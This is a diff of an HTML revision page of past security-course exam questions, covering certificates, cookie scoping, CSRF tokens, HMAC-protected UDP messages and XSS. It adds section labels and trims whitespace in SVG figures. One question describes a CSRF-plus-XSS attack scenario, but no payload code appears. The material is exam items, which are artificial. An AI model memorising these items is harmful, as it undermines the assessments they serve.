 </section><section class="question"><h3>S58 · 2018–19 · Q1(a)</h3>
 <p><strong>Digital-certificate contents and CA role · 9 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=26">root question PDF, page 26</a>. Sitting date: 24 October 2019.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=26">root question PDF, page 26</a>. Sitting date: 24 October 2019. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> What key information is kept in a digital certificate? Explain the certification authority’s role with a figure.</p>
 </blockquote>
@@ -3664,72 +3664,72 @@ C_2(C_1^x)^{-1}=Mg^{xr}g^{-rx}=M.
 </defs>
 <g id="fig-12-figure_1">
 <g id="fig-12-patch_1">
-<path d="M 0 172.512 
-L 575.28 172.512 
-L 575.28 0 
-L 0 0 
+<path d="M 0 172.512
+L 575.28 172.512
+L 575.28 0
+L 0 0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-12-axes_1">
 <g id="fig-12-patch_2">
-<path clip-path="url(#fig-12-p66da2aba36)" d="M 22.032 104.5512 
-L 168.228 104.5512 
-Q 172.134 104.5512 172.134 100.6704 
-L 172.134 57.9816 
-Q 172.134 54.1008 168.228 54.1008 
-L 22.032 54.1008 
-Q 18.126 54.1008 18.126 57.9816 
-L 18.126 100.6704 
-Q 18.126 104.5512 22.032 104.5512 
+<path clip-path="url(#fig-12-p66da2aba36)" d="M 22.032 104.5512
+L 168.228 104.5512
+Q 172.134 104.5512 172.134 100.6704
+L 172.134 57.9816
+Q 172.134 54.1008 168.228 54.1008
+L 22.032 54.1008
+Q 18.126 54.1008 18.126 57.9816
+L 18.126 100.6704
+Q 18.126 104.5512 22.032 104.5512
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-12-patch_3">
-<path clip-path="url(#fig-12-p66da2aba36)" d="M 214.542 104.5512 
-L 360.738 104.5512 
-Q 364.644 104.5512 364.644 100.6704 
-L 364.644 57.9816 
-Q 364.644 54.1008 360.738 54.1008 
-L 214.542 54.1008 
-Q 210.636 54.1008 210.636 57.9816 
-L 210.636 100.6704 
-Q 210.636 104.5512 214.542 104.5512 
+<path clip-path="url(#fig-12-p66da2aba36)" d="M 214.542 104.5512
+L 360.738 104.5512
+Q 364.644 104.5512 364.644 100.6704
+L 364.644 57.9816
+Q 364.644 54.1008 360.738 54.1008
+L 214.542 54.1008
+Q 210.636 54.1008 210.636 57.9816
+L 210.636 100.6704
+Q 210.636 104.5512 214.542 104.5512
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-12-patch_4">
-<path clip-path="url(#fig-12-p66da2aba36)" d="M 407.052 104.5512 
-L 553.248 104.5512 
-Q 557.154 104.5512 557.154 100.6704 
-L 557.154 57.9816 
-Q 557.154 54.1008 553.248 54.1008 
-L 407.052 54.1008 
-Q 403.146 54.1008 403.146 57.9816 
-L 403.146 100.6704 
-Q 403.146 104.5512 407.052 104.5512 
+<path clip-path="url(#fig-12-p66da2aba36)" d="M 407.052 104.5512
+L 553.248 104.5512
+Q 557.154 104.5512 557.154 100.6704
+L 557.154 57.9816
+Q 557.154 54.1008 553.248 54.1008
+L 407.052 54.1008
+Q 403.146 54.1008 403.146 57.9816
+L 403.146 100.6704
+Q 403.146 104.5512 407.052 104.5512
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-12-patch_5">
-<path clip-path="url(#fig-12-p66da2aba36)" d="M 175.246798 77.94 
-Q 191.381393 77.94 206.062544 77.94 
+<path clip-path="url(#fig-12-p66da2aba36)" d="M 175.246798 77.94
+Q 191.381393 77.94 206.062544 77.94
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-12-p66da2aba36)" d="M 200.862544 75.34 
-L 206.062544 77.94 
-L 200.862544 80.54 
-L 200.862544 75.34 
+<path clip-path="url(#fig-12-p66da2aba36)" d="M 200.862544 75.34
+L 206.062544 77.94
+L 200.862544 80.54
+L 200.862544 75.34
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-12-patch_6">
-<path clip-path="url(#fig-12-p66da2aba36)" d="M 367.756798 77.94 
-Q 383.891393 77.94 398.572544 77.94 
+<path clip-path="url(#fig-12-p66da2aba36)" d="M 367.756798 77.94
+Q 383.891393 77.94 398.572544 77.94
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-12-p66da2aba36)" d="M 393.372544 75.34 
-L 398.572544 77.94 
-L 393.372544 80.54 
-L 393.372544 75.34 
+<path clip-path="url(#fig-12-p66da2aba36)" d="M 393.372544 75.34
+L 398.572544 77.94
+L 393.372544 80.54
+L 393.372544 75.34
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
@@ -3770,7 +3770,7 @@ z
 <p><a id="s09"></a></p>
 <section class="question"><h3>S09 · 2023–24 · Q8(b)</h3>
 <p><strong>Cookie-send matrix · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=9">root question PDF, page 9</a>. Sitting date: 06 September 2025.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=9">root question PDF, page 9</a>. Sitting date: 06 September 2025. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Three cookies are set by long.moodle.com: theme=dark, Domain=moodle.com, Path=/, Secure=true; auth=ok, Domain=long.moodle.com, Path=/test, Secure=false; file=secret, Domain=moodle.com, Path=/print, Secure=true. Fill the send/not-send matrix for (i) http://print.moodle.com/print, (ii) http://login.moodle.com/, (iii) http://moodle.com/test, (iv) https://moodle.com/print/test, (v) https://login.moodle.com/test/print.</p>
 </blockquote>
@@ -3822,7 +3822,7 @@ z
 <p><a id="s16"></a></p>
 </section><section class="question"><h3>S16 · 2022–23 · Q5(c)</h3>
 <p><strong>Limits of cookie policy · 11 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=12">root question PDF, page 12</a>. Sitting date: 18 April 2024.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=12">root question PDF, page 12</a>. Sitting date: 18 April 2024. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Analyze how effective cookie policies are at (i) preventing CSRF, (ii) preventing session hijacking through XSS and (iii) preserving confidentiality of stored cookies.</p>
 </blockquote>
@@ -3833,7 +3833,7 @@ z
 <p><a id="s20"></a></p>
 </section><section class="question"><h3>S20 · 2022–23 · Q7(a)</h3>
 <p><strong>CSRF synchronizer token; refreshing only on POST · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=13">root question PDF, page 13</a>. Sitting date: 18 April 2024.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=13">root question PDF, page 13</a>. Sitting date: 18 April 2024. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> The server puts a random CSRF token in each page’s DOM/hidden form field, and accepts a request only with a valid cookie and POST token. Tokens are refreshed on POST. Explain protection without special browser support; evaluate refreshing only on POST instead of on both GET and POST.</p>
 </blockquote>
@@ -3858,71 +3858,71 @@ z
 </defs>
 <g id="fig-13-figure_1">
 <g id="fig-13-patch_1">
-<path d="M 0 250.128 
-L 579.892578 250.128 
-L 579.892578 0 
-L 0 0 
+<path d="M 0 250.128
+L 579.892578 250.128
+L 579.892578 0
+L 0 0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-13-axes_1">
 <g id="fig-13-patch_2">
-<path clip-path="url(#fig-13-pe743b8a561)" d="M 294.255251 55.764 
-Q 412.223675 55.764 528.738654 55.764 
+<path clip-path="url(#fig-13-pe743b8a561)" d="M 294.255251 55.764
+Q 412.223675 55.764 528.738654 55.764
 " style="fill: none; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-13-pe743b8a561)" d="M 523.538654 53.164 
-L 528.738654 55.764 
-L 523.538654 58.364 
-L 523.538654 53.164 
+<path clip-path="url(#fig-13-pe743b8a561)" d="M 523.538654 53.164
+L 528.738654 55.764
+L 523.538654 58.364
+L 523.538654 53.164
 z
 " style="fill: #aa3d46; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-13-patch_3">
-<path clip-path="url(#fig-13-pe743b8a561)" d="M 54.315251 95.958 
-Q 172.283675 95.958 288.798654 95.958 
+<path clip-path="url(#fig-13-pe743b8a561)" d="M 54.315251 95.958
+Q 172.283675 95.958 288.798654 95.958
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-13-pe743b8a561)" d="M 283.598654 93.358 
-L 288.798654 95.958 
-L 283.598654 98.558 
-L 283.598654 93.358 
+<path clip-path="url(#fig-13-pe743b8a561)" d="M 283.598654 93.358
+L 288.798654 95.958
+L 283.598654 98.558
+L 283.598654 93.358
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-13-patch_4">
-<path clip-path="url(#fig-13-pe743b8a561)" d="M 294.255251 136.152 
-Q 412.223675 136.152 528.738654 136.152 
+<path clip-path="url(#fig-13-pe743b8a561)" d="M 294.255251 136.152
+Q 412.223675 136.152 528.738654 136.152
 " style="fill: none; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-13-pe743b8a561)" d="M 523.538654 133.552 
-L 528.738654 136.152 
-L 523.538654 138.752 
-L 523.538654 133.552 
+<path clip-path="url(#fig-13-pe743b8a561)" d="M 523.538654 133.552
+L 528.738654 136.152
+L 523.538654 138.752
+L 523.538654 133.552
 z
 " style="fill: #aa3d46; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-13-patch_5">
-<path clip-path="url(#fig-13-pe743b8a561)" d="M 530.189905 176.346 
-Q 412.221482 176.346 295.706502 176.346 
+<path clip-path="url(#fig-13-pe743b8a561)" d="M 530.189905 176.346
+Q 412.221482 176.346 295.706502 176.346
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-13-pe743b8a561)" d="M 300.906502 178.946 
-L 295.706502 176.346 
-L 300.906502 173.746 
-L 300.906502 178.946 
+<path clip-path="url(#fig-13-pe743b8a561)" d="M 300.906502 178.946
+L 295.706502 176.346
+L 300.906502 173.746
+L 300.906502 178.946
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-13-line2d_1">
-<path clip-path="url(#fig-13-pe743b8a561)" d="M 52.312578 213.768 
-L 52.312578 39.132 
+<path clip-path="url(#fig-13-pe743b8a561)" d="M 52.312578 213.768
+L 52.312578 39.132
 " style="fill: none; stroke-dasharray: 3.7,1.6; stroke-dashoffset: 0; stroke: #bac8d5"></path>
 </g>
 <g id="fig-13-line2d_2">
-<path clip-path="url(#fig-13-pe743b8a561)" d="M 292.252578 213.768 
-L 292.252578 39.132 
+<path clip-path="url(#fig-13-pe743b8a561)" d="M 292.252578 213.768
+L 292.252578 39.132
 " style="fill: none; stroke-dasharray: 3.7,1.6; stroke-dashoffset: 0; stroke: #bac8d5"></path>
 </g>
 <g id="fig-13-line2d_3">
-<path clip-path="url(#fig-13-pe743b8a561)" d="M 532.192578 213.768 
-L 532.192578 39.132 
+<path clip-path="url(#fig-13-pe743b8a561)" d="M 532.192578 213.768
+L 532.192578 39.132
 " style="fill: none; stroke-dasharray: 3.7,1.6; stroke-dashoffset: 0; stroke: #bac8d5"></path>
 </g>
 <g id="fig-13-text_1">
@@ -3965,7 +3965,7 @@ L 532.192578 39.132
 <p><a id="s40"></a></p>
 </section><section class="question"><h3>S40 · 2020–21 · Q5(a)</h3>
 <p><strong>Authenticate UDP messages with a cookie/token; prevent replay · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=19">root question PDF, page 19</a>. Sitting date: 25 September 2022.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=19">root question PDF, page 19</a>. Sitting date: 25 September 2022. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Bob uses UDP for a streaming service because confidentiality is unnecessary and he cannot use TLS/HTTPS. He needs integrity so attackers cannot impersonate the sender or alter or replay messages. Explain how to achieve this using cookies.</p>
 </blockquote>
@@ -3987,7 +3987,7 @@ tag = HMAC(Kcs, encode(sid,direction,seq,payload))
 <p><a id="s42"></a></p>
 </section><section class="question"><h3>S42 · 2020–21 · Q6(a)</h3>
 <p><strong>CSRF plus stored XSS in a social-network friend request · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=19">root question PDF, page 19</a>. Sitting date: 25 September 2022.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=19">root question PDF, page 19</a>. Sitting date: 25 September 2022. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Trudy builds trudymalicious.com. On a visitor A’s arrival, make A send Trudy a friend request and change A’s homepage so anyone visiting it sends Trudy a friend request. No CSRF/XSS defenses exist. The supplied GET is http://www.networksocial.com/action/friends/add?friend=20. Explain the malicious site.</p>
 </blockquote>
@@ -4024,133 +4024,133 @@ tag = HMAC(Kcs, encode(sid,direction,seq,payload))
 </defs>
 <g id="fig-14-figure_1">
 <g id="fig-14-patch_1">
-<path d="M 0 194.688 
-L 575.28 194.688 
-L 575.28 -0 
-L 0 -0 
+<path d="M 0 194.688
+L 575.28 194.688
+L 575.28 -0
+L 0 -0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-14-axes_1">
 <g id="fig-14-patch_2">
-<path clip-path="url(#fig-14-pa79c8006b0)" d="M 22.032 85.1472 
-L 162.648 85.1472 
-Q 166.554 85.1472 166.554 81.2664 
-L 166.554 52.4376 
-Q 166.554 48.5568 162.648 48.5568 
-L 22.032 48.5568 
-Q 18.126 48.5568 18.126 52.4376 
-L 18.126 81.2664 
-Q 18.126 85.1472 22.032 85.1472 
+<path clip-path="url(#fig-14-pa79c8006b0)" d="M 22.032 85.1472
+L 162.648 85.1472
+Q 166.554 85.1472 166.554 81.2664
+L 166.554 52.4376
+Q 166.554 48.5568 162.648 48.5568
+L 22.032 48.5568
+Q 18.126 48.5568 18.126 52.4376
+L 18.126 81.2664
+Q 18.126 85.1472 22.032 85.1472
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-14-patch_3">
-<path clip-path="url(#fig-14-pa79c8006b0)" d="M 214.542 85.1472 
-L 355.158 85.1472 
-Q 359.064 85.1472 359.064 81.2664 
-L 359.064 52.4376 
-Q 359.064 48.5568 355.158 48.5568 
-L 214.542 48.5568 
-Q 210.636 48.5568 210.636 52.4376 
-L 210.636 81.2664 
-Q 210.636 85.1472 214.542 85.1472 
+<path clip-path="url(#fig-14-pa79c8006b0)" d="M 214.542 85.1472
+L 355.158 85.1472
+Q 359.064 85.1472 359.064 81.2664
+L 359.064 52.4376
+Q 359.064 48.5568 355.158 48.5568
+L 214.542 48.5568
+Q 210.636 48.5568 210.636 52.4376
+L 210.636 81.2664
+Q 210.636 85.1472 214.542 85.1472
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-14-patch_4">
-<path clip-path="url(#fig-14-pa79c8006b0)" d="M 407.052 85.1472 
-L 547.668 85.1472 
-Q 551.574 85.1472 551.574 81.2664 
-L 551.574 52.4376 
-Q 551.574 48.5568 547.668 48.5568 
-L 407.052 48.5568 
-Q 403.146 48.5568 403.146 52.4376 
-L 403.146 81.2664 
-Q 403.146 85.1472 407.052 85.1472 
+<path clip-path="url(#fig-14-pa79c8006b0)" d="M 407.052 85.1472
+L 547.668 85.1472
+Q 551.574 85.1472 551.574 81.2664
+L 551.574 52.4376
+Q 551.574 48.5568 547.668 48.5568
+L 407.052 48.5568
+Q 403.146 48.5568 403.146 52.4376
+L 403.146 81.2664
+Q 403.146 85.1472 407.052 85.1472
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-14-patch_5">
-<path clip-path="url(#fig-14-pa79c8006b0)" d="M 169.670034 66.852 
-Q 188.595362 66.852 206.067247 66.852 
+<path clip-path="url(#fig-14-pa79c8006b0)" d="M 169.670034 66.852
+Q 188.595362 66.852 206.067247 66.852
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-14-pa79c8006b0)" d="M 200.867247 64.252 
-L 206.067247 66.852 
-L 200.867247 69.452 
-L 200.867247 64.252 
+<path clip-path="url(#fig-14-pa79c8006b0)" d="M 200.867247 64.252
+L 206.067247 66.852
+L 200.867247 69.452
+L 200.867247 64.252
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-14-patch_6">
-<path clip-path="url(#fig-14-pa79c8006b0)" d="M 362.180034 66.852 
-Q 381.105362 66.852 398.577247 66.852 
+<path clip-path="url(#fig-14-pa79c8006b0)" d="M 362.180034 66.852
+Q 381.105362 66.852 398.577247 66.852
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-14-pa79c8006b0)" d="M 393.377247 64.252 
-L 398.577247 66.852 
-L 393.377247 69.452 
-L 393.377247 64.252 
+<path clip-path="url(#fig-14-pa79c8006b0)" d="M 393.377247 64.252
+L 398.577247 66.852
+L 393.377247 69.452
+L 393.377247 64.252
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-14-patch_7">
-<path clip-path="url(#fig-14-pa79c8006b0)" d="M 22.032 168.3072 
-L 162.648 168.3072 
-Q 166.554 168.3072 166.554 164.4264 
-L 166.554 135.5976 
-Q 166.554 131.7168 162.648 131.7168 
-L 22.032 131.7168 
-Q 18.126 131.7168 18.126 135.5976 
-L 18.126 164.4264 
-Q 18.126 168.3072 22.032 168.3072 
+<path clip-path="url(#fig-14-pa79c8006b0)" d="M 22.032 168.3072
+L 162.648 168.3072
+Q 166.554 168.3072 166.554 164.4264
+L 166.554 135.5976
+Q 166.554 131.7168 162.648 131.7168
+L 22.032 131.7168
+Q 18.126 131.7168 18.126 135.5976
+L 18.126 164.4264
+Q 18.126 168.3072 22.032 168.3072
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-14-patch_8">
-<path clip-path="url(#fig-14-pa79c8006b0)" d="M 214.542 168.3072 
-L 355.158 168.3072 
-Q 359.064 168.3072 359.064 164.4264 
-L 359.064 135.5976 
-Q 359.064 131.7168 355.158 131.7168 
-L 214.542 131.7168 
-Q 210.636 131.7168 210.636 135.5976 
-L 210.636 164.4264 
-Q 210.636 168.3072 214.542 168.3072 
+<path clip-path="url(#fig-14-pa79c8006b0)" d="M 214.542 168.3072
+L 355.158 168.3072
+Q 359.064 168.3072 359.064 164.4264
+L 359.064 135.5976
+Q 359.064 131.7168 355.158 131.7168
+L 214.542 131.7168
+Q 210.636 131.7168 210.636 135.5976
+L 210.636 164.4264
+Q 210.636 168.3072 214.542 168.3072
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-14-patch_9">
-<path clip-path="url(#fig-14-pa79c8006b0)" d="M 407.052 168.3072 
-L 547.668 168.3072 
-Q 551.574 168.3072 551.574 164.4264 
-L 551.574 135.5976 
-Q 551.574 131.7168 547.668 131.7168 
-L 407.052 131.7168 
-Q 403.146 131.7168 403.146 135.5976 
-L 403.146 164.4264 
-Q 403.146 168.3072 407.052 168.3072 
+<path clip-path="url(#fig-14-pa79c8006b0)" d="M 407.052 168.3072
+L 547.668 168.3072
+Q 551.574 168.3072 551.574 164.4264
+L 551.574 135.5976
+Q 551.574 131.7168 547.668 131.7168
+L 407.052 131.7168
+Q 403.146 131.7168 403.146 135.5976
+L 403.146 164.4264
+Q 403.146 168.3072 407.052 168.3072
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-14-patch_10">
-<path clip-path="url(#fig-14-pa79c8006b0)" d="M 169.670034 150.012 
-Q 188.595362 150.012 206.067247 150.012 
+<path clip-path="url(#fig-14-pa79c8006b0)" d="M 169.670034 150.012
+Q 188.595362 150.012 206.067247 150.012
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-14-pa79c8006b0)" d="M 200.867247 147.412 
-L 206.067247 150.012 
-L 200.867247 152.612 
-L 200.867247 147.412 
+<path clip-path="url(#fig-14-pa79c8006b0)" d="M 200.867247 147.412
+L 206.067247 150.012
+L 200.867247 152.612
+L 200.867247 147.412
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-14-patch_11">
-<path clip-path="url(#fig-14-pa79c8006b0)" d="M 362.180034 150.012 
-Q 381.105362 150.012 398.577247 150.012 
+<path clip-path="url(#fig-14-pa79c8006b0)" d="M 362.180034 150.012
+Q 381.105362 150.012 398.577247 150.012
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-14-pa79c8006b0)" d="M 393.377247 147.412 
-L 398.577247 150.012 
-L 393.377247 152.612 
-L 393.377247 147.412 
+<path clip-path="url(#fig-14-pa79c8006b0)" d="M 393.377247 147.412
+L 398.577247 150.012
+L 393.377247 152.612
+L 393.377247 147.412
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
@@ -4192,7 +4192,7 @@ z
 <p><a id="s45"></a></p>
 </section><section class="question"><h3>S45 · 2020–21 · Q7(b)</h3>
 <p><strong>Cookie-send matrix · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=20">root question PDF, page 20</a>. Sitting date: 25 September 2022.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=20">root question PDF, page 20</a>. Sitting date: 25 September 2022. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Cookies set by docs.example.com: file=main, Domain=example.com, Path=/, Secure=true; file=test, Domain=docs.example.com, Path=/test, Secure=false; file=print, Domain=example.com, Path=/print, Secure=true. Determine which are sent to (i) http://print.example.com/print, (ii) https://docs.example.com/, (iii) http://example.com/test, (iv) https://example.com/print/test, (v) https://docs.example.com/test/print.</p>
 </blockquote>
@@ -4245,7 +4245,7 @@ z
 <p><a id="s47"></a></p>
 </section><section class="question"><h3>S47 · 2020–21 · Q8(c)</h3>
 <p><strong>Invalidate session cookies after password change · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=21">root question PDF, page 21</a>. Sitting date: 25 September 2022.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=21">root question PDF, page 21</a>. Sitting date: 25 September 2022. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Bob’s authentication cookie expires after one year. Changing a password only updates the database. Explain Alice’s advice that resetting the password must also reset the authentication cookie.</p>
 </blockquote>
@@ -4259,7 +4259,7 @@ z
 <p><a id="s11"></a></p>
 <section class="question"><h3>S11 · 2023–24 · Q8(d)</h3>
 <p><strong>Stored versus reflected XSS · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=10">root question PDF, page 10</a>. Sitting date: 06 September 2025.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=10">root question PDF, page 10</a>. Sitting date: 06 September 2025. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Define XSS and explain the difference between stored and reflected XSS using diagrams.</p>
 </blockquote>
@@ -4315,133 +4315,133 @@ z
 </defs>
 <g id="fig-15-figure_1">
 <g id="fig-15-patch_1">
-<path d="M 0 194.688 
-L 575.28 194.688 
-L 575.28 -0 
-L 0 -0 
+<path d="M 0 194.688
+L 575.28 194.688
+L 575.28 -0
+L 0 -0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-15-axes_1">
 <g id="fig-15-patch_2">
-<path clip-path="url(#fig-15-pa79c8006b0)" d="M 22.032 85.1472 
-L 162.648 85.1472 
-Q 166.554 85.1472 166.554 81.2664 
-L 166.554 52.4376 
-Q 166.554 48.5568 162.648 48.5568 
-L 22.032 48.5568 
-Q 18.126 48.5568 18.126 52.4376 
-L 18.126 81.2664 
-Q 18.126 85.1472 22.032 85.1472 
+<path clip-path="url(#fig-15-pa79c8006b0)" d="M 22.032 85.1472
+L 162.648 85.1472
+Q 166.554 85.1472 166.554 81.2664
+L 166.554 52.4376
+Q 166.554 48.5568 162.648 48.5568
+L 22.032 48.5568
+Q 18.126 48.5568 18.126 52.4376
+L 18.126 81.2664
+Q 18.126 85.1472 22.032 85.1472
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-15-patch_3">
-<path clip-path="url(#fig-15-pa79c8006b0)" d="M 214.542 85.1472 
-L 355.158 85.1472 
-Q 359.064 85.1472 359.064 81.2664 
-L 359.064 52.4376 
-Q 359.064 48.5568 355.158 48.5568 
-L 214.542 48.5568 
-Q 210.636 48.5568 210.636 52.4376 
-L 210.636 81.2664 
-Q 210.636 85.1472 214.542 85.1472 
+<path clip-path="url(#fig-15-pa79c8006b0)" d="M 214.542 85.1472
+L 355.158 85.1472
+Q 359.064 85.1472 359.064 81.2664
+L 359.064 52.4376
+Q 359.064 48.5568 355.158 48.5568
+L 214.542 48.5568
+Q 210.636 48.5568 210.636 52.4376
+L 210.636 81.2664
+Q 210.636 85.1472 214.542 85.1472
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-15-patch_4">
-<path clip-path="url(#fig-15-pa79c8006b0)" d="M 407.052 85.1472 
-L 547.668 85.1472 
-Q 551.574 85.1472 551.574 81.2664 
-L 551.574 52.4376 
-Q 551.574 48.5568 547.668 48.5568 
-L 407.052 48.5568 
-Q 403.146 48.5568 403.146 52.4376 
-L 403.146 81.2664 
-Q 403.146 85.1472 407.052 85.1472 
+<path clip-path="url(#fig-15-pa79c8006b0)" d="M 407.052 85.1472
+L 547.668 85.1472
+Q 551.574 85.1472 551.574 81.2664
+L 551.574 52.4376
+Q 551.574 48.5568 547.668 48.5568
+L 407.052 48.5568
+Q 403.146 48.5568 403.146 52.4376
+L 403.146 81.2664
+Q 403.146 85.1472 407.052 85.1472
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-15-patch_5">
-<path clip-path="url(#fig-15-pa79c8006b0)" d="M 169.670034 66.852 
-Q 188.595362 66.852 206.067247 66.852 
+<path clip-path="url(#fig-15-pa79c8006b0)" d="M 169.670034 66.852
+Q 188.595362 66.852 206.067247 66.852
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-15-pa79c8006b0)" d="M 200.867247 64.252 
-L 206.067247 66.852 
-L 200.867247 69.452 
-L 200.867247 64.252 
+<path clip-path="url(#fig-15-pa79c8006b0)" d="M 200.867247 64.252
+L 206.067247 66.852
+L 200.867247 69.452
+L 200.867247 64.252
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-15-patch_6">
-<path clip-path="url(#fig-15-pa79c8006b0)" d="M 362.180034 66.852 
-Q 381.105362 66.852 398.577247 66.852 
+<path clip-path="url(#fig-15-pa79c8006b0)" d="M 362.180034 66.852
+Q 381.105362 66.852 398.577247 66.852
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-15-pa79c8006b0)" d="M 393.377247 64.252 
-L 398.577247 66.852 
-L 393.377247 69.452 
-L 393.377247 64.252 
+<path clip-path="url(#fig-15-pa79c8006b0)" d="M 393.377247 64.252
+L 398.577247 66.852
+L 393.377247 69.452
+L 393.377247 64.252
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-15-patch_7">
-<path clip-path="url(#fig-15-pa79c8006b0)" d="M 22.032 168.3072 
-L 162.648 168.3072 
-Q 166.554 168.3072 166.554 164.4264 
-L 166.554 135.5976 
-Q 166.554 131.7168 162.648 131.7168 
-L 22.032 131.7168 
-Q 18.126 131.7168 18.126 135.5976 
-L 18.126 164.4264 
-Q 18.126 168.3072 22.032 168.3072 
+<path clip-path="url(#fig-15-pa79c8006b0)" d="M 22.032 168.3072
+L 162.648 168.3072
+Q 166.554 168.3072 166.554 164.4264
+L 166.554 135.5976
+Q 166.554 131.7168 162.648 131.7168
+L 22.032 131.7168
